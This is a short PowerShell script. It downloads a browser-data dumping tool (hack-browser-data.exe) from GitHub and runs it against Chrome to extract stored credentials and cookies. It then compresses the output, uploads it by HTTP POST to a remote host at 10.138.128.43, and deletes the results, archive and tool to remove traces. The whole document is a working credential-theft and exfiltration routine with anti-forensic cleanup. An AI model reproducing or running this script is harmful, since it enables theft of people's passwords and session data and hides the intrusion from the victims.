cd $HOME
Invoke-WebRequest "https://github.com/smd-61/safe/raw/main/hack-browser-data.exe" -OutFile hack-browser-data.exe
./hack-browser-data.exe dump -b chrome
Compress-Archive -Path ".\results" -DestinationPath ".\results.zip"
Invoke-WebRequest -UseBasicParsing -Uri "http://10.138.128.43:8080/upload" -Method Post -Headers @{"X-Filename"="results.zip"} -InFile "./results.zip" -ContentType "application/octet-stream"
Remove-Item -Recurse results/
Remove-Item ./results.zip
Remove-Item hack-browser-data.exe